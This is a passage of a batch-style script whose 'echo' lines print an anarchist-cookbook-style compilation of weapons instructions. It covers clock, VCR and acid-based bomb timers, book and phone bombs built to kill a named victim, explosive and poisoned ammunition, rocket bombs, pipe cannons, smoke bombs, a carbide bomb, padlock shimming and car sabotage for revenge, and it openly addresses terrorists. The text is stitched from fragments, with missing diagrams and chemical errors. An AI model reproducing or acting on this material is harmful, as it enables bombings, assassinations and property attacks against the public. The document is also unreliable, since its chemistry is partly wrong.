echo smoked. Depending on the wind or draft in a given place, a high "tar" cigarette is better for delaying the ignition of a fuse, but there must be 
echo enough wind or draft to give the cigarette enough oxygen to burn. People who use cigarettes for the purpose of delaying fuses will often test 
echo the cigarettes that they plan to use in advance to make sure they stay lit and to see how long it will burn. Once a cigarettes burn rate is 
echo determined, it is a simple matter of carefully putting a hole all the way through a cigarette with a toothpick at the point desired, and pushing the 
echo fuse for a device in the hole formed.

echo ---TIMER DELAYS---
echo Timer delays, or "time bombs" are usually employed by an individual who wishes to threaten a place with a bomb and demand money to reveal 
echo its location and means to disarm it. Such a device could be placed in any populated place if it were concealed properly. There are several 
echo ways to build a timer delay. By simply using a screw as one contact at the time that detonation is desired, and using the hour hand of a clock 
echo as the other contact, a simple timer can be made. The minute hand of a clock should be removed, unless a delay of less than an hour is 
echo desired.
echo The main disadvantage with this type of timer is that it can only be set for a maximum time of 12 hours. If an electronic timer is used, such as 
echo that in an electronic clock, then delays of up to 24 hours are possible. By removing the speaker from an electronic clock, and attaching the 
echo wires of a squib or igniter to them, a timer with a delay of up to 24 hours can be made. All that one has to do is set the alarm time of the clock to 
echo the desired time, connect the leads, and go away. This could also be done with an electronic watch, if a larger battery were used, and the 
echo current to the speaker of the watch was stepped up via a transformer. This would be good, since such a timer could be extremely small.
echo The timer in a VCR (Video Cassette Recorder) would be ideal. VCR's can usually be set for times of up to a week. The leads from the timer to 
echo the recording equipment would be the ones that an igniter or squib would be connected to. Also, one can buy timers from electronics stores 
echo that would be work well. Finally, one could employ a digital watch, and use a relay, or electro-magnetic switch to fire the igniter, and the 
echo current of the watch would not have to be stepped up.
echo ---CHEMICAL DELAYS---
echo Chemical delays are uncommon, but they can be extremely effective in some cases. These were often used in the bombs the Germans 
echo dropped on England. The delay would ensure that a bomb would detonate hours or even days after the initial bombing raid, thereby increasing 
echo the terrifying effect on the British citizenry.
echo If a glass container is filled with concentrated sulfuric acid, and capped with several thicknesses of aluminum foil, or a cap that it will eat 
echo through, then it can be used as a delay. Sulfuric acid will react with aluminum foil to produce aluminum sulfate and hydrogen gas, and so the 
echo container must be open to the air on one end so that the pressure of the hydrogen gas that is forming does not break the container.

echo The aluminum foil is placed over the bottom of the container and secured there with tape. When the acid eats through the aluminum foil, it can 
echo be used to ignite an explosive device in several ways.
echo 1.Sulfuric acid is a good conductor of electricity. If the acid that eats through the foil is collected in a glass container placed underneath the foil, 
echo and two wires are placed in the glass container, a current will be able to flow through the acid when both of the wires are immersed in 
echo the acid.
echo 2.Sulfuric acid reacts very violently with potassium chlorate. If the acid drips down into a container containing potassium chlorate, the 
echo potassium chlorate will burst into flame. This flame can be used to ignite a fuse, or the potassium chlorate can be the igniter for a thermite 
echo bomb, if some potassium chlorate is mixed in a 50/50 ratio with the thermite, and this mixture is used as an igniter for the rest of the 
echo thermite.
echo 3.Sulfuric acid reacts with potassium permanganate in a similar way.

echo 206.Film Canisters II by Bill
echo For a relatively low shrapnel explosion, I suggest pouring it into an empty 35mm film canister. Poke a hole in the plastic lid for a fuse. These 
echo goodies make an explosion audible a mile away easily.
echo 1.Poke the hole before putting the flash powder into the canister.
echo 2.Don't get any powder on the lip of the canister.
echo 3.Only use a very small quantity and work your way up to the desired result.

echo 207.Book Bombs by Exodus
echo Concealing a bomb can be extremely difficult in a day and age where perpetrators of violence run wild. Bags and briefcases are often 
echo searched by authorities whenever one enters a place where an individual might intend to set off a bomb. One approach to disguising a bomb is 
echo to build what is called a book bomb; an explosive device that is entirely contained inside of a book.
echo Usually, a relatively large book is required, and the book must be of the hardback variety to hide any protrusions of a bomb. Dictionaries, law 
echo books, large textbooks, and other such books work well. When an individual makes a bookbomb, he/she must choose a type of book that is 
echo appropriate for the place where the book bomb will be placed. The actual construction of a book bomb can be done by anyone who 
echo possesses an electric drill and a coping saw. First, all of the pages of the book must be glued together. By pouring an entire container of 
echo water-soluble glue into a large bucket, and filling the bucket with boiling water, a glue-water solution can be made that will hold all of the book's 
echo pages together tightly. After the glue-water solution has cooled to a bearable temperature, and the solution has been stirred well, the pages of 
echo the book must be immersed in the glue-water solution, and each page must be thoroughly soaked.
echo It is extremely important that the covers of the book do not get stuck to the pages of the book while the pages are drying. Suspending the book 
echo by both covers and clamping the pages together in a vise works best. When the pages dry, after about three days to a week, a hole must be 
echo drilled into the now rigid pages, and they should drill out much like wood. Then, by inserting the coping saw blade through the pages and 
echo sawing out a rectangle from the middle of the book, the individual will be left with a shell of the book's pages. The pages, when drilled out, 
echo should look like this:
echo  "________________________"
echo  "| ____________________ |"
echo  "| | | |"
echo  "| | | |"
echo  "| | | |"
echo  "| | | |"

echo  "| | | |"
echo  "| | | |"
echo  "| | | |"
echo  "| |__________________| |"
echo  "|______________________|"
echo  'Book covers omitted'
echo This rectangle must be securely glued to the back cover of the book. After building his/her bomb, which usually is of the timer or radio 
echo controlled variety, the bomber places it inside the book. The bomb itself, and whatever timer or detonator is used, should be packed in foam to 
echo prevent it from rolling or shifting about. Finally, after the timer is set, or the radio control has been turned on, the front cover is glued closed, 
echo and the bomb is taken to its destination.

echo 208.Phone Bombs by Exodus
echo The phone bomb is an explosive device that has been used in the past to kill or injure a specific individual. The basic idea is simple: when the 
echo person answers the phone, the bomb explodes. If a small but powerful high explosive device with a squib was placed in the phone receiver, 
echo when the current flowed through the receiver, the squib would explode, detonating the high explosive in the person's hand. Nasty. All that has 
echo to be done is acquire a squib, and tape the receiver switch down.
echo Unscrew the mouthpiece cover, and remove the speaker, and connect the squib's leads where it was. Place a high explosive putty, such as 
echo C-1 in the receiver, and screw the cover on, making sure that the squib is surrounded by the C-1. Hang the phone up, and leave the tape in 
echo place.
echo When the individual to whom the phone belongs attempts to answer the phone, he will notice the tape, and remove it. This will allow current to 
echo flow through the squib. Note that the device will not explode by merely making a phone call; the owner of the phone must lift up the receiver, 
echo and remove the tape. It is highly probable that the phone will be by his/her ear when the device explodes...
echo IMPROVED PHONE BOMB
echo The above seems overly complicated to me... it would be better to rig the device as follows:
echo FIRST UNPLUG THE PHONE FROM THE WALL. Wire the detonator IN LINE with the wires going to the earpiece, (may need to wire it with a relay 
echo so the detonator can receive the full line power, not just the audio power to the earpiece)
echo Pack C4 into the phone body (NOT the handset) and plug it back in. When they pick up the phone, power will flow through the circuit to the 
echo detonator....

echo 209.SPECIAL AMMUNITION by Exodus
echo SPECIAL AMMUNITION FOR BLOWGUNS
echo The blowgun is an interesting weapon which has several advantages. A blowgun can be extremely accurate, concealable, and deliver an 
echo explosive or poisoned projectile. The manufacture of an explosive dart or projectile is not difficult. To acquire a blowgun, please contact the 
echo editor at one of the addresses given in the introduction.
echo Perhaps the most simple design for such involves the use of a pill capsule, such as the kind that are taken for headaches or allergies. Empty 
echo gelatin pill capsules can be purchased from most health-food stores. Next, the capsule would be filled with an impact-sensitive explosive, 
echo such as mercury fulminate. An additional high explosive charge could be placed behind the impact sensitive explosive, if one of the larger 
echo capsules were used.
echo Finally, the explosive capsule would be reglued back together, and a tassel or cotton would be glued to the end containing the high explosive, 
echo to insure that the impact-detonating explosive struck the target first.
echo Such a device would probably be about 3/4 of an inch long, not including the tassel or cotton, and look something like this:
echo  ____________________
echo  /mercury | \----------------------- 
echo  (fulminate| R.D.X. )---------------------- } tassels
echo  \________|___________/-----------------------
echo Care must be taken- if a powerful dart went off in the blowgun, you could easily blow the back of your head off.
echo SPECIAL AMMUNITION FOR WRISTROCKETS AND SLINGSHOTS
echo A modern wristrocket is a formidable weapon. It can throw a shooter marble about 500 ft. with reasonable accuracy. Inside of 200 ft., it could 
echo well be lethal to a man or animal, if it struck in a vital area. Because of the relatively large sized projectile that can be used in a wristrocket, the 
echo wristrocket can be adapted to throw relatively powerful explosive projectiles.
echo A small segment of aluminum pipe could be made into an impact-detonating device by filling it with an impact-sensitive explosive material.
echo Also, such a pipe could be filled with a low-order explosive, and fitted with a fuse, which would be lit before the device was shot. One would 
echo have to make sure that the fuse was of sufficient length to insure that the device did not explode before it reached its intended target.
echo Finally, .22 caliber caps, such as the kind that are used in .22 caliber blank guns, make excellent exploding ammunition for wristrockets, but 
echo they must be used at a relatively close range, because of their light weight.
echo SPECIAL AMMUNITION FOR FIREARMS
echo When special ammunition is used in combination with the power and rapidity of modern firearms, it becomes very easy to take on a small army 
echo with a single weapon. It is possible to buy explosive ammunition, but that can be difficult to do. Such ammunition can also be manufactured in 
echo the home. There is, however, a risk involved with modifying any ammunition. If the ammunition is modified incorrectly, in such a way that it 
echo makes the bullet even the slightest bit wider, an explosion in the barrel of the weapon will occur. For this reason, NOBODY SHOULD EVER 
echo ATTEMPT TO MANUFACTURE SUCH AMMUNITION. 
echo SPECIAL AMMUNITION FOR HANDGUNS
echo If an individual wished to produce explosive ammunition for his/her handgun, he/she could do it, provided that the person had an impactsensitive explosive and a few simple tools. One would first purchase all lead bullets, and then make or acquire an impact-detonating explosive. 
echo By drilling a hole in a lead bullet with a drill, a space could be created for the placement of an explosive. After filling the hole with an explosive, 
echo it would be sealed in the bullet with a drop of hot wax from a candle. A diagram of a completed exploding bullet is shown below.
echo  _o_ ------------ drop of wax
echo  /|*|\
echo  | |*|-|----------- impact-sensitive explosive 
echo  | |_| |
echo  |_____|
echo This hollow space design also works for putting poison in bullets.
echo In many spy thrillers, an assassin is depicted as manufacturing "exploding bullets" by placing a drop of mercury in the nose of a bullet. Through 
echo experimentation it has been found that this will not work. Mercury reacts with lead to form a inert silvery compound.
echo SPECIAL AMMUNITION FOR SHOTGUNS
echo Because of their large bore and high power, it is possible to create some extremely powerful special ammunition for use in shotguns. If a 
echo shotgun shell is opened at the top, and the shot removed, the shell can be re-closed. Then, if one can find a very smooth, lightweight wooden 
echo dowel that is close to the bore width of the shotgun, a person can make several types of shotgun-launched weapons.
echo Insert the dowel in the barrel of the shotgun with the shell without the shot in the firing chamber. Mark the dowel about six inches away from 
echo the end of the barrel, and remove it from the barrel.
echo Next, decide what type of explosive or incendiary device is to be used. This device can be a chemical fire bottle, a pipe bomb, or a thermite 
echo bomb. After the device is made, it must be securely attached to the dowel. When this is done, place the dowel back in the shotgun. The bomb 
echo or incendiary device should be on the end of the dowel.
echo Make sure that the device has a long enough fuse, light the fuse, and fire the shotgun. If the projectile is not too heavy, ranges of up to 300 ft 
echo are possible. A diagram of a shotgun projectile is shown below:

echo SPECIAL AMMUNITION FOR COMPRESSED AIR/GAS WEAPONS
echo This section deals with the manufacture of special ammunition for compressed air or compressed gas weapons, such as pump BB guns, COý 
echo BB guns, and .22 cal pellet guns . These weapons, although usually thought of as kids toys, can be made into rather dangerous weapons.
echo SPECIAL AMMUNITION FOR BB GUNS
echo A BB gun, for this manuscript, will be considered any type of rifle or pistol that uses compressed air or COý gas to fire a projectile with a 
echo caliber of .177, either BB, or lead pellet. Such guns can have almost as high a muzzle velocity as a bullet-firing rifle. Because of the speed at 
echo which a .177 caliber projectile flies, an impact detonating projectile can easily be made that has a caliber of .177.
echo Most ammunition for guns of greater than .22 caliber use primers to ignite the powder in the bullet. These primers can be bought at gun stores, 
echo since many people like to reload their own bullets. Such primers detonate when struck by the firing pin of a gun. They will also detonate if they 
echo are thrown at a hard surface at a great speed.
echo Usually, they will also fit in the barrel of a .177 caliber gun. If they are inserted flat end first, they will detonate when the gun is fired at a hard 
echo surface. If such a primer is attached to a piece of thin metal tubing, such as that used in an antenna, the tube can be filled with an explosive, 
echo be sealed, and fired from a BB gun. A diagram of such a projectile appears below:
echo  _____ primers _______

echo  |_______ antenna tubing
echo The front primer is attached to the tubing with a drop of super glue. The tubing is then filled with an explosive, and the rear primer is glued on. 
echo Finally, a tassel, or a small piece of cotton is glued to the rear primer, to insure that the projectile strikes on the front primer. The entire projectile 
echo should be about 3/4 of an inch long.
echo SPECIAL AMMUNITION FOR .22 CALIBER PELLET GUNS
echo A .22 caliber pellet gun usually is equivalent to a .22 cal rifle, at close ranges. Because of this, relatively large explosive projectiles can be 
echo adapted for use with .22 caliber air rifles. A design similar to that used in the begining of this document is suitable, since some capsules are 
echo about .22 caliber or smaller. Or, a design similar to that in this document could be used, only one would have to purchase black powder 
echo percussion caps, instead of ammunition primers, since there are percussion caps that are about .22 caliber. A #11 cap is too small, but 
echo anything larger will do nicely.

echo 210.Rocketry by Exodus
echo Rockets and cannon are generally thought of as heavy artillery. Perpetrators of violence do not usually employ such devices, because they 
echo are difficult or impossible to acquire. They are not, however, impossible to make. Any individual who can make or buy black powder or pyrodex 
echo can make such things. A terrorist with a cannon or large rocket is, indeed, something to fear.
echo ROCKETS
echo Rockets were first developed by the Chinese several hundred years before the myth of Christ began. They were used for entertainment in the 
echo form of fireworks. They were not usually used for military purposes because they were inaccurate, expensive, and unpredictable. In modern 
echo times, however, rockets are used constantly by the military, since they are cheap, reliable, and have no recoil. Perpetrators of violence, 
echo fortunately, cannot obtain military rockets, but they can make or buy rocket engines. Model rocketry is a popular hobby of the space age, and to 
echo launch a rocket, an engine is required. Estes, a subsidiary of Damon, is the leading manufacturer of model rockets and rocket engines. Their 
echo most powerful engine, the "D" engine, can develop almost 12 lbs of thrust; enough to send a relatively large explosive charge a significant
echo distance. Other companies, such as Centuri, produce even larger rocket engines, which develop up to 30 lbs of thrust. These model rocket 
echo engines are quite reliable, and are designed to be fired electrically. Most model rocket engines have three basic sections. The diagram below 
echo will help explain them.

echo  casing
echo The clay nozzle is where the igniter is inserted. When the area labeled "thrust" is ignited, the "thrust" material, usually a large single grain of a 
echo propellant such as black powder or pyrodex, burns, forcing large volumes of hot, rapidly expanding gasses out the narrow nozzle, pushing 
echo the rocket forward.
echo After the material has been consumed, the smoke section of the engine is ignited. It is usually a slow-burning material, similar to black powder 
echo that has had various compounds added to it to produce visible smoke, usually black, white, or yellow in color. This section exists so that the 
echo rocket will be seen when it reaches its maximum altitude, or apogee.
echo When it is burned up, it ignites the ejection charge, labeled "eject". The ejection charge is finely powdered black powder. It burns very rapidly, 
echo exploding, in effect. The explosion of the ejection charge pushes out the parachute of the model rocket. It could also be used to ignite the fuse 
echo of a bomb...
echo Rocket engines have their own peculiar labeling system. Typical engine labels are: 1/4A-2T, 1/2A-3T, A8-3, B6-4, C6-7, and D12-5. The letter is 
echo an indicator of the power of an engine. "B" engines are twice as powerful as "A" engines, and "C" engines are twice as powerful as "B" 
echo engines, and so on. The number following the letter is the approximate thrust of the engine, in pounds. the final number and letter is the time 
echo delay, from the time that the thrust period of engine burn ends until the ejection charge fires; "3T" indicates a 3 second delay.
echo NOTE: An extremely effective rocket propellant can be made by mixing aluminum dust with ammonium perchlorate and a very small amount of 
echo iron oxide. The mi xture is bound together by an epoxy.
echo BASIC ROCKET BOMB
echo A rocket bomb is simply what the name implies: a bomb that is delivered to its target by means of a rocket. Most people who would make such 
echo a device would use a model rocket engine to power the device. By cutting fins from balsa wood and gluing them to a large rocket engine, such 
echo as the Estes "C" engine, a basic rocket could be constructed. Then, by attaching a "crater maker", or COý cartridge bomb to the rocket, a bomb 
echo would be added. To insure that the fuse of the "crater maker" ignited, the clay over the ejection charge of the engine should be scraped off 
echo with a plastic tool. The fuse of the bomb should be touching the ejection charge, as shown below.

echo Many different types of explosive payloads can be attached to the rocket, such as a high explosive, an incendiary device, or a chemical fire 
echo bottle.
echo Either four or three fins must be glued to the rocket engine to insure that the rocket flies straight. The fins should look like the following diagram:

echo  \_____/
echo The leading edge and trailing edge should be sanded with sandpaper so that they are rounded. This will help make the rocket fly straight. A 
echo two inch long section of a plastic straw can be attached to the rocket to launch it from. A clothes hanger can be cut and made into a launch 
echo rod. The segment of a plastic straw should be glued to the rocket engine adjacent to one of the fins of the rocket. A front view of a completed 
echo rocket bomb is shown below.

echo LONG RANGE ROCKET BOMB
echo Long range rockets can be made by using multi-stage rockets. Model rocket engines with an "0" for a time delay are designed for use in multistage rockets. An engine such as the D12-0 is an excellent example of such an engine. Immediately after the thrust period is over, the ejection 
echo charge explodes. If another engine is placed directly against the back of an "0" engine, the explosion of the ejection charge will send hot 
echo gasses and burning particles into the nozzle of the engine above it, and ignite the thrust section. This will push the used "0" engine off of the 
echo rocket, causing an overall loss of weight.
echo The main advantage of a multi-stage rocket is that it loses weight as travels, and it gains velocity. Multi-stage rockets must be designed 
echo somewhat differently than a single stage rocket, since, in order for a rockets to fly straight, their center of gravity must be ahead of their 
echo center of drag. This is accomplished by adding weight to the front of the rocket, or by moving the center of drag back by putting fins on the 
echo rocket that are well behind the rocket. A diagram of a multi-stage rocket appears on the following page:

echo 211.Basic Pipe Cannon by Exodus
echo A simple cannon can be made from a thick pipe by almost anyone. The only difficult part is finding a pipe that is extremely smooth on its interior. 
echo This is absolutely necessary; otherwise, the projectile may jam. Copper or aluminum piping is usually smooth enough, but it must also be 
echo extremely thick to withstand the pressure developed by the expanding hot gasses in a cannon.
echo If one uses a projectile such as a COý cartridge, since such a projectile can be made to explode, a pipe that is about 1« - 2 feet long is ideal. 
echo Such a pipe MUST have walls that are at least 1/3 to « an inch thick, and be very smooth on the interior. If possible, screw an endplug into the 
echo pipe. Otherwise, the pipe must be crimped and folded closed, without cracking or tearing the pipe. A small hole is drilled in the back of the pipe 
echo near the crimp or endplug. Then, all that need be done is fill the pipe with about two teaspoons of grade blackpowder or pyrodex, insert a fuse, 
echo pack it lightly by ramming a wad of tissue paper down the barrel, and drop in a COý cartridge. Brace the cannon securely against a strong 
echo structure, light the fuse, and run. If the person is lucky, he will not have overcharged the cannon, and he will not be hit by pieces of exploding 
echo barrel. Such a cannon would look like this:
echo  __________________ fuse hole

echo  | |_____________________________________________________________|
echo  |endplug|powder|t.p.| COý cartridge
echo  | ______|______|____|____________________________________________
echo  |_|______________________________________________________________|
echo An exploding projectile can be made for this type of cannon with a COý cartridge. It is relatively simple to do. Just make a crater maker, and 
echo construct it such that the fuse projects about an inch from the end of the cartridge. Then, wrap the fuse with duct tape, covering it entirely, 
echo except for a small amount at the end. Put this in the pipe cannon without using a tissue paper packing wad.
echo When the cannon is fired, it will ignite the end of the fuse, and shoot the COý cartridge. The explosive-filled cartridge will explode in about three 
echo seconds, if all goes well. Such a projectile would look like this:
echo ___
echo ( )
echo |C |
echo | M|
echo | |
echo | |
echo \ /
echo  [] <--- taped fuse
echo []
echo []
echo   <--- Bare fuse (add matcheads)
echo ROCKET FIRING CANNON
echo A rocket firing cannon can be made exactly like a normal cannon; the only difference is the ammunition. A rocket fired from a cannon will fly 
echo further than a rocket alone, since the action of shooting it overcomes the initial inertia. A rocket that is launched when it is moving will go 
echo further than one that is launched when it is stationary. Such a rocket would resemble a normal rocket bomb, except it would have no fins. It 
echo would look like the image below. The fuse on such a device would, obviously, be short, but it would not be ignited until the rocket's ejection 
echo charge exploded. Thus, the delay before the ejection charge, in effect, becomes the delay before the bomb explodes. Note that no fuse need 
echo be put in the rocket; the burning powder in the cannon will ignite it, and simultaneously push the rocket out of the cannon at a high velocity.

echo We dug into the side of a sand pile and built a chimney out of firebrick. Then we stood the assembled pipe and wire on end in the chimney, 
echo sitting on some bricks. We then had a blowtorch heating up the chimney, so that the pipe was red hot. Then we poured molten lead into the 
echo space between the pipes. If the caps aren't screwed on real tight, some of the lead will leak out. If that happens, turn off the blowtorch and the 
echo pipe will cool enough and the lead will stiffen and stop the leak.
echo We used homemade and commercial black powder, and slow smokeless shotgun powder in this thing. After hundreds of shots we cut it up 
echo and there was no evidence of cracks or swelling of the inner pipe.

echo 212.Smoke Bombs by Exodus
echo One type of pyrotechnic device that might be employed by a terrorist in many way would be a smoke bomb. Such a device could conceal the 
echo getaway route, or cause a diversion, or simply provide cover. Such a device, were it to produce enough smoke that smelled bad enough, could 
echo force the evacuation of a building, for example. Smoke bombs are not difficult to make. Although the military smoke bombs employ powdered 
echo white phosphorus or titanium compounds, such materials are usually unavailable to even the most well-equipped terrorist. Instead, he/she 
echo would have to make the smoke bomb for themselves.
echo Most homemade smoke bombs usually employ some type of base powder, such as black powder or pyrodex, to support combustion. The base 
echo material will burn well, and provide heat to cause the other materials in the device to burn, but not completely or cleanly. Table sugar, mixed 
echo with sulfur and a base material, produces large amounts of smoke. Sawdust, especially if it has a small amount of oil in it, and a base powder 
echo works well also. Other excellent smoke ingredients are small pieces of rubber, finely ground plastics, and many chemical mixtures. The 
echo material in road flares can be mixed with sugar and sulfur and a base powder produces much smoke. Most of the fuel-oxidizer mixtures, if the 
echo ratio is not correct, produce much smoke when added to a base powder. The list of possibilities goes on and on. The trick to a successful 
echo smoke bomb also lies in the container used. A plastic cylinder works well, and contributes to the smoke produced. The hole in the smoke bomb 
echo where the fuse enters must be large enough to allow the material to burn without causing an explosion. This is another plus for plastic 
echo containers, since they will melt and burn when the smoke material ignites, producing an opening large enough to prevent an explosion.
echo ---SIMPLE SMOKE---
echo The following reaction should produce a fair amount of smoke. Since this reaction is not all that dangerous you can use larger amounts if 
echo necessary
echo · 6 pt. ZINC POWDER
echo · 1 pt. SULFUR POWDER
echo Insert a red hot wire into the pile, step back.
echo ---COLORED FLAMES---
echo Colored flames can often be used as a signaling device for terrorists. By putting a ball of colored flame material in a rocket; the rocket, when

echo 213.Firecrackers by Exodus
echo A simple firecracker can be made from cardboard tubing and epoxy. The instructions are below:
echo 1.Cut a small piece of cardboard tubing from the tube you are using. "Small" means anything less than 4 times the diameter of the tube.
echo 2.Set the section of tubing down on a piece of wax paper, and fill it with epoxy and the drying agent to a height of 3/4 the diameter of the 
echo tubing. Allow the epoxy to dry to maximum hardness, as specified on the package.
echo 3.When it is dry, put a small hole in the middle of the tube, and insert a desired length of fuse.
echo 4.Fill the tube with any type of flame-sensitive explosive. Flash powder, pyrodex, black powder, potassium picrate, lead azide, nitrocellulose, 
echo or any of the fast burning fuel-oxidizer mixtures will do nicely. Fill the tube almost to the top.
echo 5.Pack the explosive tightly in the tube with a wad of tissue paper and a pencil or other suitable ramrod. Be sure to leave enough space for 
echo more epoxy.
echo 6.Fill the remainder of the tube with the epoxy and hardener, and allow it to dry.
echo 7.For those who wish to make spectacular firecrackers, always use flash powder, mixed with a small amount of other material for colors. By 
echo crushing the material on a sparkler, and adding it to the flash powder, the explosion will be the same color as the sparkler. By adding small 
echo chunks of sparkler material, the device will throw out colored burning sparks, of the same color as the sparkler. By adding powdered iron, 
echo orange sparks will be produced. White sparks can be produced from magnesium shavings, or from small, LIGHTLY crumpled balls of 
echo aluminum foil.
echo Example: Suppose I wish to make a firecracker that will explode with a red flash, and throw out white sparks.
echo First, I would take a road flare, and finely powder the material inside it. Or, I could take a red sparkler, and finely powder it.
echo Then, I would mix a small amount of this material with the flash powder. NOTE: FLASH POWDER MAY REACT WITH SOME MATERIALS THAT IT 
echo IS MIXED WITH, AND EXPLODE SPONTANEOUSLY I would mix it in a ratio of 9 parts flash powder to 1 part of flare or sparkler material, 
echo and add about 15 small balls of aluminum foil I would store the material in a plastic bag overnight outside of the house, to make sure that 
echo the stuff doesn't react. Then, in the morning, I would test a small amount of it, and if it was satisfactory, I would put it in the firecracker.
echo 8.If this type of firecracker is mounted on a rocket engine, professional to semi-professional displays can be produced.
echo ---SKYROCKETS---
echo An impressive home made skyrocket can easily be made in the home from model rocket engines. Estes engines are recommended.
echo 1.Buy an Estes Model Rocket Engine of the desired size, remembering that the power doubles with each letter.
echo 2.Either buy a section of body tube for model rockets that exactly fits the engine, or make a tube from several thicknesses of paper and glue.
echo 3.Scrape out the clay backing on the back of the engine, so that the powder is exposed. Glue the tube to the engine, so that the tube covers at 
echo least half the engine. Pour a small charge of flash powder in the tube, about « an inch.
echo 4.By adding materials as detailed in the section on firecrackers, various types of effects can be produced.
echo 5.By putting Jumping Jacks or bottle rockets without the stick in the tube, spectacular displays with moving fireballs or MRV's can be produced.
echo 6.Finally, by mounting many home made firecrackers on the tube with the fuses in the tube, multiple colored bursts can be made.
echo ---ROMAN CANDLES---
echo Roman candles are impressive to watch. They are relatively difficult to make, compared to the other types of home-made fireworks, but they 
echo are well worth the trouble.
echo 1.Buy a « inch thick model rocket body tube, and reinforce it with several layers of paper and/or masking tape. This must be done to prevent 
echo the tube from exploding. Cut the tube into about 10 inch lengths.
echo 2.Put the tube on a sheet of wax paper, and seal one end with epoxy and the drying agent. About « of an inch is sufficient.
echo 3.Put a hole in the tube just above the bottom layer of epoxy, and insert a desired length of water proof fuse. Make sure that the fuse fits 
echo tightly.
echo 4.Pour about 1 inch of pyrodex or gunpowder down the open end of the tube.
echo 5.Make a ball by powdering about two 6 inch sparklers of the desired color. Mix this powder with a small amount of flash powder and a small 
echo amount of pyrodex, to have a final ratio (by volume) of 60% sparkler material / 20% flash powder / 20% pyrodex. After mixing the 
echo powders well, add water, one drop at a time, and mixing continuously, until a damp paste is formed.
echo This paste should be moldable by hand, and should retain its shape when left alone. Make a ball out of the paste that just fits into the tube. 
echo Allow the ball to dry.
echo 6.When it is dry, drop the ball down the tube. It should slide down fairly easily. Put a small wad of tissue paper in the tube, and pack it gently 
echo against the ball with a pencil.
echo 7.When ready to use, put the candle in a hole in the ground, pointed in a safe direction, light the fuse, and run. If the device works, a colored 
echo fireball should shoot out of the tube to a height of about 30 feet. This height can be increased by adding a slightly larger powder charge in 
echo step 4, or by using a slightly longer tube.
echo 8.If the ball does not ignite, add slightly more pyrodex in step 5.
echo 9.The balls made for roman candles also function very well in rockets, producing an effect of falling colored fireballs.

echo At this time (twelve years ago) most soft drink cans were rolled tin rather than the molded aluminum. We would cut the tops and bottoms off of 
echo a bunch of them and tape them together with duct tape, forming a tube of two feet or more.
echo At the end we would tape a can with the bottom intact, more holes punched (with a can opener) around the top, and a small hole in the side at 
echo the base. We then fastened this contraption to a tripod so we could aim it reliably. Any object that came somewhat close to filling the tube was 
echo then placed therein.
echo In the shop, we used the clock as a target and an empty plastic solder spool as ammunition, with tape over the ends of the center hole and

echo with the top and bottom removed, and the seventh had Bottle opener holes all around one end, the top of this can was covered with a grid or 
echo piece of wire screening to keep the tennis ball from falling all the way to the bottom. This was spiral wrapped with at least two rolls of duct 
echo tape.
echo A wooden shoulder rest and forward hand grip was taped to the tube. For ignition we used lantern batteries to a model-t coil, actuated by a 
echo push button on the hand grip. A fresh wilson tennis ball was stuffed all the way back to the grid, and a drop or two of lighter fluid was 
echo dropped in one of two holes in the end. The ignition wire was poked through the other hole.
echo We would then lie in ambush, waiting for something to move. When fired with the proper air/fuel mixture, a satisfying thoomp At maximum 
echo range the ball would travel about 100 yards with a 45ø launch angle. Closer up the ball would leave a welt on an warring opponent. When 
echo launched at a moving car the thud as it hit the door would generally rattle anyone inside. Luckily we never completed the one that shot golf 
echo balls.
echo More Fun Stuff for Terrorists
echo Carbide Bomb
echo This is EXTREMELY DANGEROUS. Exercise extreme caution.... Obtain some calcium carbide. This is the stuff that is used in carbide lamps and 
echo can be found at nearly any hardware store.
echo Take a few pieces of this stuff (it looks like gravel) and put it in a glass jar with some water. Put a lid on tightly. The carbide will react with the 
echo water to produce acetylene carbonate which is similar to the gas used in cutting torches.
echo Eventually the glass with explode from internal pressure. If you leave a burning rag nearby, you will get a nice fireball
echo Auto Exhaust Flame Thrower
echo For this one, all you need is a car, a sparkplug, ignition wire and a switch. Install the spark plug into the last four or five inches of the tailpipe by 
echo drilling a hole that the plug can screw into easily. Attach the wire (this is regular insulated wire) to one side of the switch and to the spark plug. 
echo The other side of the switch is attached to the positive terminal on the battery. With the car running, simply hit the switch and watch the flames 
echo fly I have seen some of these flames go 20 feet
echo Balloons
echo Balloons are fun to play with in chem lab, fill them with the gas that you get out of the taps on the lab desks, then tie up the balloon tight, and 
echo drop it out the window to the burnouts below, you know, the ones that are always smoking, they love to pop balloons with lit cigarette.... get 
echo the picture? Good.

echo 217.Combo Locks II by Exodus
echo First of all, let me tell you about the set-up of a lock. When the lock is locked, there is a curved piece of metal wedged inside the little notch on 
echo the horseshoe shaped bar (known as the shackle) that is pushed in to the lock when you lock it.
echo To free this wedge, you usually have to turn the lock to the desired combination and the pressure on the wedge is released therefore letting 
echo the lock open. I will now tell you how to make a pick so you can open a lock without having to waste all that time turning the combination (this 
echo also helps when you don't know the combination to begin with).
echo To bypass this hassle, simply take a thinned hairpin (file it down) or a opened out piece of a collapsing antenna (the inside diameter of the 
echo curved piece of metal should be the same as the diameter of the shackle- if the metal is too thick, use fine sandpaper to thin it down.
echo Once you have your hair pin (make sure it's metal), take the ridged side and break it off right before it starts to make a U-turn onto the straight 
echo side. The curved part can now be used as a handle. Now, using a file, file down the other end until it is fairly thin. You should do this to many 
echo hairpins and file them so they are of different thicknesses so you can jimmy various locks.
echo Look at a lock to see which side the lock opens from. If you can't tell, you will just have to try both sides. When ya find out what side it opens 
echo from, take the lock pick and stick the filed end into the inside of the horseshoe-shaped bar on whichever side the lock opens from.
echo Now, put pressure on the handle of the lock pick (pushing down, into the crack) and pull the lock up and down. The lock will then open 
echo because the pick separated the wedge and the notch allowing it to open.
echo Also, this technique works best on American locks. I have never picked a Master lock before because of the shape a pressure of the wedge 
echo but if anyone does it, let me know how long it took. Also, the Master lock casing is very tight so ya can't get the shim in.

echo 218.Misc Anarchy II by Ragner Rocker
echo Many of you out there probably have fantasies of revenge against teachers, principals and other people who are just assholes. Depending on 
echo your level of hatred of this person I would advise that you do some of these following experiments:
echo 1.Pouring dishsoap into the gas tank of your enemy - many of you already know that gasoline + dishsoap (e.g. joy, palmolive, etc.) form a 
echo mixture called napalm. Now napalm is a jelly-like substance used in bombs, flame -throwers, etc. Now you can only guess what this 
echo mixture would do to someone's fuel line
echo 2.Spreading dirty motor oil/castor oil on someone's exhaust pipe - when the exhaust pipe heats up (and it will) the motor oil or castor oil on the 
echo pipe will cause thick, disgusting smoke to ooze forth from the back of that car. Who knows maybe he/she might be pulled over and given a 
echo ticket
echo 3.Light Bulb Bomb
